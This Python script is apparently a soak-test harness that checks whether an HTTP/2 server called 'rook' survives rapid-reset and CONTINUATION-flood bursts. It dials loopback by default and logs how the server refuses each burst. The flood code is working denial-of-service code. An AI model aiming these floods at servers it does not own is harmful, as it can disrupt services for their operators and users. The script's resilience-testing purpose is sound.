#!/usr/bin/env python3
"""soak_burst.py — adversarial HTTP/2 bursts for the rook soak (plan §10).

Two modes, both over TLS with ALPN:

  rapid-reset   open one h2 connection, then HEADERS + immediate RST_STREAM
                for thousands of streams (the 2023 "rapid reset" shape).
  continuation  send a HEADERS frame without END_HEADERS, then an endless
                run of CONTINUATION frames — the pass is rook's header
                buffer cap firing (431/400/close) before memory moves.

A burst only counts if h2 was actually negotiated: without ALPN there is
no h2 to attack, and an uncounted burst would report success having tested
nothing. The refusal kind is printed, not just "it closed":
GOAWAY(ENHANCE_YOUR_CALM) and a bare RST/close are different answers, and
a change between runs is a behaviour change.

Output is one line of key=value pairs for the soak's burst log.

Usage: soak_burst.py --host smoke.rookserver.app --port 443 --mode rapid-reset
"""

import argparse
import socket
import ssl
import sys
import time

import h2.connection
import h2.events
import h2.settings


def connect(host, port, dial):
    context = ssl.create_default_context()
    context.set_alpn_protocols(["h2"])
    # The soak runs on the box, so the default dial is loopback while SNI
    # and :authority stay the real host. --connect exists for field-testing
    # from elsewhere.
    raw = socket.create_connection((dial, port), timeout=10)
    sock = context.wrap_socket(raw, server_hostname=host)
    return sock


def pump(sock, conn, seconds=0.0):
    """Feed received bytes into the h2 state machine; return events."""
    if seconds:
        sock.settimeout(seconds)
    try:
        data = sock.recv(65536)
    except (socket.timeout, TimeoutError):
        return []
    except (ConnectionResetError, ssl.SSLError, BrokenPipeError):
        return ["connection-closed"]
    if not data:
        return ["connection-closed"]
    return conn.receive_data(data) or []


def describe(events):
    for event in events:
        if isinstance(event, h2.events.ConnectionTerminated):
            return f"goaway(error_code={event.error_code:#x})"
    for event in events:
        if isinstance(event, h2.events.StreamReset):
            return f"rst_stream(error_code={event.error_code:#x})"
    if "connection-closed" in events:
        return "connection-closed"
    return "none"


def rapid_reset(host, port, streams, dial):
    sock = connect(host, port, dial)
    alpn = sock.selected_alpn_protocol()
    if alpn != "h2":
        sock.close()
        print(f"valid=INVALID reason=alpn-{alpn or 'none'}")
        return 0
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    events = pump(sock, conn, seconds=2.0)
    sent = 0
    refusal = describe(events)
    started = time.monotonic()
    while sent < streams and refusal == "none":
        stream_id = conn.get_next_available_stream_id()
        try:
            conn.send_headers(
                stream_id,
                [(":method", "GET"), (":path", "/"), (":scheme", "https"),
                 (":authority", host)],
            )
            conn.reset_stream(stream_id)
            sock.sendall(conn.data_to_send())
        except (ConnectionResetError, ssl.SSLError, BrokenPipeError, h2.exceptions.H2Error):
            refusal = "connection-closed"
            break
        sent += 1
        if sent % 512 == 0:
            refusal = describe(pump(sock, conn, seconds=0.1))
    # Drain briefly to catch a GOAWAY that arrived after the last flush.
    if refusal == "none":
        refusal = describe(pump(sock, conn, seconds=2.0))
    elapsed = time.monotonic() - started
    sock.close()
    print(f"valid=ok streams_reset={sent} refusal={refusal} seconds={elapsed:.1f}")
    return 0


def frame(ftype, flags, stream_id, payload):
    """One HTTP/2 frame, RFC 7540 §4.1."""
    header = len(payload).to_bytes(3, "big") + bytes([ftype, flags])
    header += (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
    return header + payload


def read_frames(sock, seconds):
    """Parse frames for `seconds`; returns (refusal, saw_response)."""
    sock.settimeout(seconds)
    refusal = "none"
    deadline = time.monotonic() + seconds
    buffer = b""
    while time.monotonic() < deadline and refusal == "none":
        try:
            data = sock.recv(65536)
        except (socket.timeout, TimeoutError):
            break
        except (ConnectionResetError, ssl.SSLError, BrokenPipeError):
            return "connection-closed", False
        if not data:
            return "connection-closed", False
        buffer += data
        while len(buffer) >= 9:
            length = int.from_bytes(buffer[:3], "big")
            if len(buffer) < 9 + length:
                break
            ftype, flags = buffer[3], buffer[4]
            payload = buffer[9:9 + length]
            buffer = buffer[9 + length:]
            if ftype == 0x7 and len(payload) >= 8:  # GOAWAY
                error_code = int.from_bytes(payload[4:8], "big")
                refusal = f"goaway(error_code={error_code:#x})"
            elif ftype == 0x3 and len(payload) >= 4:  # RST_STREAM
                error_code = int.from_bytes(payload[:4], "big")
                refusal = f"rst_stream(error_code={error_code:#x})"
            elif ftype == 0x1 or ftype == 0x0:  # HEADERS or DATA: answered
                return refusal, True
    return refusal, False


def continuation(host, port, max_frames, dial):
    """CONTINUATION flood, raw frames: python-h2's state machine rightly
    refuses to emit a header block it cannot complete, so the malformed
    sequence is crafted by hand. The pass is rook's header buffer cap
    firing (431/400/close) before memory moves."""
    from hpack import Encoder

    sock = connect(host, port, dial)
    alpn = sock.selected_alpn_protocol()
    if alpn != "h2":
        sock.close()
        print(f"valid=INVALID reason=alpn-{alpn or 'none'}")
        return 0

    started = time.monotonic()
    # Client preface + empty SETTINGS; ACK the server's SETTINGS.
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + frame(0x4, 0x0, 0, b""))
    sock.settimeout(2.0)
    try:
        sock.recv(65536)
    except (socket.timeout, TimeoutError):
        pass
    sock.sendall(frame(0x4, 0x1, 0, b""))  # SETTINGS ack

    # HEADERS without END_HEADERS obliges the peer to read CONTINUATIONs.
    block = Encoder().encode(
        [(":method", "GET"), (":path", "/"), (":scheme", "https"),
         (":authority", host)]
    )
    sock.sendall(frame(0x1, 0x0, 1, block))  # HEADERS, flags=0: no END_HEADERS

    sent = 0
    refusal = "none"
    answered = False
    while sent < max_frames and refusal == "none" and not answered:
        payload = Encoder().encode([("x-flood", "a" * 4096)])
        try:
            sock.sendall(frame(0x9, 0x0, 1, payload))  # CONTINUATION, no END_HEADERS
        except (ConnectionResetError, ssl.SSLError, BrokenPipeError):
            refusal = "connection-closed"
            break
        sent += 1
        if sent % 64 == 0:
            refusal, answered = read_frames(sock, 0.1)
    if refusal == "none" and not answered:
        refusal, answered = read_frames(sock, 2.0)
    elapsed = time.monotonic() - started
    sock.close()
    if answered and refusal == "none":
        refusal = "response-received"
    print(f"valid=ok continuation_frames={sent} refusal={refusal} seconds={elapsed:.1f}")
    return 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--mode", choices=["rapid-reset", "continuation"], required=True)
    parser.add_argument("--connect", default="127.0.0.1",
                        help="address to dial; SNI/:authority stay --host")
    parser.add_argument("--streams", type=int, default=5000)
    parser.add_argument("--max-frames", type=int, default=1024)
    args = parser.parse_args()

    if args.mode == "rapid-reset":
        return rapid_reset(args.host, args.port, args.streams, args.connect)
    return continuation(args.host, args.port, args.max_frames, args.connect)


if __name__ == "__main__":
    sys.exit(main())
